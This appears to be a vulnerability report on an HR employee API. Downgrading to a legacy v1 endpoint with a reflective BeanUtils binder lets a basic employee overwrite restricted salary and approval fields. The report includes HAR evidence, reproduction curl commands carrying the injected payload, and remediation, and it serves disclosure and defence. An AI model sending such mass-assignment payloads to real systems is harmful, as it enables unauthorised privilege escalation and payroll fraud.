## Findings

1. **Version downgrade to bypass mass assignment protection — `POST /api/v1/employee/update` accepts restricted HR fields**: the employee portal's modern v3 endpoint (`POST /api/v3/employees/{id}/profile`) enforces a strict Go DTO that discards fields like `salary_band` and `manager_approval_bypass`. The legacy v1 endpoint (`POST /api/v1/employee/update`) on the same Kong gateway routes to the Apache Tomcat Java monolith, which uses `BeanUtils.populate(employeeRecord, payload)` to blindly map every JSON key to the ORM entity — including restricted columns in `HR.EMPLOYEES`. A standard employee with scope `["profile:read", "profile:write_basic"]` can bypass the v3 scope check entirely by targeting the v1 path with the same valid JWT.

2. **Attacker successfully escalated own salary band and set manager approval bypass**: employee `EMP-1099` submitted `"salary_band": "EXEC_TIER_1"` and `"manager_approval_bypass": 1` to the legacy endpoint. The HAR verification GET confirms the Oracle database now reflects `salary_band: "EXEC_TIER_1"` and `manager_approval_bypass: 1` for `EMP-1099` — changes that require `payroll:write` scope which the attacker does not possess.

## Evidence

- **HAR entry 1 — legacy update** (`startedDateTime: 2026-04-08T10:05:12.441Z`, elapsed 302 ms): `POST https://api.peoplesync.corp/api/v1/employee/update` over `HTTP/1.1`; JWT encodes `sub: EMP-1099`, `scopes: ["profile:read", "profile:write_basic"]`; body `{"phone_number": "555-0199", "salary_band": "EXEC_TIER_1", "manager_approval_bypass": 1}`; response `X-Powered-By: Servlet/3.0; Apache Tomcat/8.5.84`, HTTP 200, `{"status": "processed"}`.
- **HAR entry 2 — verification GET** (`startedDateTime: 2026-04-08T10:05:45.105Z`, elapsed 85 ms): `GET https://api.peoplesync.corp/api/v3/employees/EMP-1099/profile`; same JWT; response HTTP 200, `x-microservice: go-profile-svc`, body confirms `"salary_band": "EXEC_TIER_1"`, `"manager_approval_bypass": 1`, `"last_updated": "2026-04-08T10:05:12Z"` — Oracle update committed 33 seconds before the verification.
- **Flawed legacy controller** (section 6.2): `BeanUtils.populate(employeeRecord, payload)` — every key in the POST body is mapped to a setter on the `Employee` ORM entity. Fields `SALARY_BAND`, `HOURLY_WAGE`, `MANAGER_APPROVAL_BYPASS` in `HR.EMPLOYEES` all have corresponding setter methods reachable through BeanUtils reflection.
- **Secure v3 controller** (section 6.1): `json.NewDecoder(r.Body).Decode(&updateData)` targeting `ProfileUpdateDTO` with only `PhoneNumber`, `HomeAddress`, `EmergencyContact` — restricted fields are mathematically excluded from the struct.
- **Schema confirms field sensitivity** (section 5.0): `SALARY_BAND`, `HOURLY_WAGE`, and `MANAGER_APPROVAL_BYPASS` are annotated "Highly Restricted Fields (Should only be modified by HR)".

## Reproduction

Step 1 — confirm the v3 endpoint blocks restricted field injection:

```bash
curl -i -X POST "https://api.peoplesync.corp/api/v3/employees/EMP-1099/profile" \
  -H "Authorization: Bearer <JWT_EMP-1099_profile:write_basic>" \
  -H "Content-Type: application/json" \
  -d '{"phone_number": "555-0199", "salary_band": "EXEC_TIER_1"}'
```

Expected: HTTP 200 or 400; `salary_band` silently dropped; profile update only affects `phone_number`.

Step 2 — downgrade to v1 and inject restricted fields:

```bash
curl -i -X POST "https://api.peoplesync.corp/api/v1/employee/update" \
  -H "Authorization: Bearer <JWT_EMP-1099_profile:write_basic>" \
  -H "Content-Type: application/json" \
  -d '{"phone_number": "555-0199", "salary_band": "EXEC_TIER_1", "manager_approval_bypass": 1}'
```

Expected secure outcome: HTTP 403 — `payroll:write` scope required, or restricted fields rejected.  
Observed vulnerable outcome: HTTP 200 `{"status": "processed"}`; subsequent `GET /api/v3/employees/EMP-1099/profile` returns `salary_band: "EXEC_TIER_1"`, `manager_approval_bypass: 1`.

## Remediation

- **Restrict the legacy v1 endpoint at the Kong gateway**: add a Kong plugin that validates the `payroll:write` scope before routing to `/api/v1/employee/update`. Alternatively, remove the v1 endpoint from external-facing routes and limit it to internal ERP network addresses only.
- **Replace `BeanUtils.populate()` with explicit field binding** in the Java monolith: list each allowed field explicitly (`employeeRecord.setPhoneNumber(...)`, etc.) and never populate from an unrestricted map. Delete or disable setter methods on `Employee` for restricted fields (`setSalaryBand`, `setManagerApprovalBypass`, `setHourlyWage`).
- **Implement a blocklist at the application layer**: if `BeanUtils` cannot be replaced immediately, add a pre-populate check that removes any restricted key from the payload map before `BeanUtils.populate()` is called — `payload.remove("salary_band"); payload.remove("manager_approval_bypass");`.
- **Scope enforcement parity**: both v1 and v3 APIs must enforce the same JWT scope requirements for equivalent operations. Any modification to `SALARY_BAND` or `MANAGER_APPROVAL_BYPASS` must require `payroll:write` scope regardless of the API version routing.
